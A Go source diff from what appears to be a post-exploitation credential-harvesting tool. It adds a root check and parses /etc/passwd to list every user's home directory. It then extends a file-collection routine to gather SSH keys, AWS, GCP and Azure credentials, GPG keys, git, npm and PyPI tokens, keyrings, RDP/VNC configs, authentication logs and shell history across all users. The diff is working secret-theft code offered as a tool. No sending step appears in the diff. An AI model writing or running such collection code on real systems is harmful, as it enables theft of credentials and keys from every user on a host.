@@ -1,6 +1,7 @@
 package internal
 
 import (
+	"bufio"
 	"bytes"
 	"encoding/json"
 	"fmt"
@@ -11,6 +12,7 @@ import (
 	"os/user"
 	"path/filepath"
 	"runtime"
+	"strings"
 )
 
 // DetectDefaultShell detects the default shell and returns the history file path.
@@ -50,53 +52,121 @@ func flushZshHistory() {
 	}
 }
 
+func rootCheck() bool {
+	if os.Geteuid() == 0 {
+		return true
+	} else {
+		return false
+	}
+}
+
+func getUsersHomedir() []string {
+    // array to hold all the users on the system 
+    var users []string
+    badUsers := []string{"/usr/sbin/nologin", "/bin/sync", "/bin/false",}
+
+	if _, err := os.Stat("/etc/passwd"); err != nil {
+		fmt.Printf("[!] Error getting users: %v\n", err)
+        return users
+    }
+    file, err := os.OpenFile("/etc/passwd", os.O_RDONLY, 0644)
+    if err != nil {
+        fmt.Printf("[!] Error opening file: %v\n", err)
+        return users
+    }
+    defer file.Close()
+    
+    scanner := bufio.NewScanner(file) 
+    for scanner.Scan() {
+        line := scanner.Text()
+        fields := strings.Split(line, ":")
+        if len(fields) < 7 {
+            // pass over lines that dont have 7 fields
+            continue
+        }
+        isBadUsers := false
+        for _, b := range badUsers {
+            if fields[6] == b {
+                isBadUsers = true
+                break
+            }
+        }
+        if !isBadUsers {
+            users = append(users, fields[5])
+        }
+    }
+    if err := scanner.Err(); err != nil {
+        fmt.Printf("[!] Error reading file: %v\n", err)
+    }
+
+    return users
+}
+
+
+
 // ScanSensitiveFiles collects all files from specified paths, including full directories.
 func ScanSensitiveFiles(outputDir string) ([]string, error) {
-	// gets the current users home directory
-	// what if there are two users, what if we are root, also want to get anything under /home/user
-	homeDir, _ := os.UserHomeDir()
-
-	paths := []string{
-		filepath.Join(homeDir, ".ssh"),                   // SSH keys
-		filepath.Join(homeDir, ".aws"),                   // AWS credentials
-		filepath.Join(homeDir, ".gnupg"),                 // GPG keys
-		filepath.Join(homeDir, ".git-credentials"),       // Git credentials
-		filepath.Join(homeDir, ".gitconfig"),             // Git global config
-		filepath.Join(homeDir, ".docker"),                // Docker config
-		filepath.Join(homeDir, ".kube"),                  // Kubernetes config
-		filepath.Join(homeDir, ".config/gcloud"),         // Google Cloud config
-		filepath.Join(homeDir, ".azure"),                 // Azure config
-		filepath.Join(homeDir, ".openvpn"),               // OpenVPN config
-		filepath.Join(homeDir, ".profile"),               // User profile
-		filepath.Join(homeDir, ".npmrc"),                 // NPM credentials
-		filepath.Join(homeDir, ".pypirc"),                // Python package repository credentials
-		filepath.Join(homeDir, ".netrc"),                 // Netrc (generic credentials)
-		filepath.Join(homeDir, ".config/freerdp"),        // Freerdp files
-		filepath.Join(homeDir, ".local/share/remmina"),   // Remmina RDP files
-		filepath.Join(homeDir, ".config/remmina"),        // Remmina RDP files
-		filepath.Join(homeDir, ".remmina"),               // Remmina RDP files
-		filepath.Join(homeDir, ".local/share/keyrings"),  // Keyrings
-		filepath.Join(homeDir, ".config/rclone"),         // rclone backup configs
-		filepath.Join(homeDir, ".config/rclone_browser"), // rclone_browser configs
-		"/etc/passwd",        							  // User information
-		"/etc/group",                                     // Group information
-		"/etc/hostname",                                  // System hostname
-		"/etc/hosts",                                     // Hosts file
-		"/etc/ssl",                                       // SSL certificates
-		"/etc/apache2",                                   // Apache2 configs
-		"/etc/httpd",                                     // httpd configs conf/ and conf.d/
-		"/etc/nginx/conf.d",                              // nginx configs
-		"/var/log/auth.log",                              // Authentication logs (Linux-specific)
-		"/var/log/secure",                                // Secure logs (Red Hat/CentOS-specific)
-		"/tmp/ssh-*",                                     // Temporary SSH files
-		DetectDefaultShell(),                             // Shell history
-	}
 
 	var files []string
-	for _, path := range paths {
-		files = append(files, expandPath(path)...)
+	var existingFiles [] string
+	// means we can go anywhere
+	isRoot := rootCheck()
+	// gets the current users home directory
+	// what if there are two users, what if we are root, also want to get anything under /home/user
+	// homeDir, _ := os.UserHomeDir()
+	usersHomeDir := getUsersHomedir()
+	
+	for _, homeDir := range usersHomeDir {
+		if homeDir == "/root" && !isRoot {
+			continue
+		}
+
+		paths := []string{
+			filepath.Join(homeDir, ".ssh"),                   // SSH keys
+			filepath.Join(homeDir, ".aws"),                   // AWS credentials
+			filepath.Join(homeDir, ".gnupg"),                 // GPG keys
+			filepath.Join(homeDir, ".git-credentials"),       // Git credentials
+			filepath.Join(homeDir, ".gitconfig"),             // Git global config
+			filepath.Join(homeDir, ".docker"),                // Docker config
+			filepath.Join(homeDir, ".kube"),                  // Kubernetes config
+			filepath.Join(homeDir, ".config/gcloud"),         // Google Cloud config
+			filepath.Join(homeDir, ".azure"),                 // Azure config
+			filepath.Join(homeDir, ".openvpn"),               // OpenVPN config
+			filepath.Join(homeDir, ".profile"),               // User profile
+			filepath.Join(homeDir, ".npmrc"),                 // NPM credentials
+			filepath.Join(homeDir, ".pypirc"),                // Python package repository credentials
+			filepath.Join(homeDir, ".netrc"),                 // Netrc (generic credentials)
+			filepath.Join(homeDir, ".config/freerdp"),        // Freerdp files
+			filepath.Join(homeDir, ".local/share/remmina"),   // Remmina RDP files
+			filepath.Join(homeDir, ".config/remmina"),        // Remmina RDP files
+			filepath.Join(homeDir, ".remmina"),               // Remmina RDP files
+			filepath.Join(homeDir, ".local/share/keyrings"),  // Keyrings
+			filepath.Join(homeDir, ".config/rclone"),         // rclone backup configs
+			filepath.Join(homeDir, ".config/rclone_browser"), // rclone_browser configs
+			filepath.Join(homeDir, ".vnc"),					  // VNC files 
+			"/etc/passwd",        							  // User information
+			"/etc/group",                                     // Group information
+			"/etc/hostname",                                  // System hostname
+			"/etc/hosts",                                     // Hosts file
+			"/etc/ssl",                                       // SSL certificates
+			"/etc/apache2/apache2.conf",                      // Apache2 config
+			"/etc/apache2/sites-enabled",                     // Apache2 sites-enabled
+			"/etc/httpd",                                     // httpd configs conf/ and conf.d/
+			"/etc/nginx/conf.d",                              // nginx configs
+			"/var/log/auth.log",                              // Authentication logs (Linux-specific)
+			"/var/log/secure",                                // Secure logs (Red Hat/CentOS-specific)
+			"/tmp/ssh-*",                                     // Temporary SSH files
+			DetectDefaultShell(),                             // Shell history
+		}
+	
+		// var files []string
+		for _, path := range paths {
+			files = append(files, expandPath(path)...)
+		}
+	
+		// existingFiles := filterExistingFiles(files)
+		existingFiles = filterExistingFiles(files)
 	}
-	existingFiles := filterExistingFiles(files)
 
 	// Save system info
 	systemInfoPath, err := saveSystemInfo(outputDir)
@@ -106,7 +176,7 @@ func ScanSensitiveFiles(outputDir string) ([]string, error) {
 
 	// Add system info archive to the files list
 	existingFiles = append(existingFiles, systemInfoPath)
-
+	
 	return existingFiles, nil
 }
 
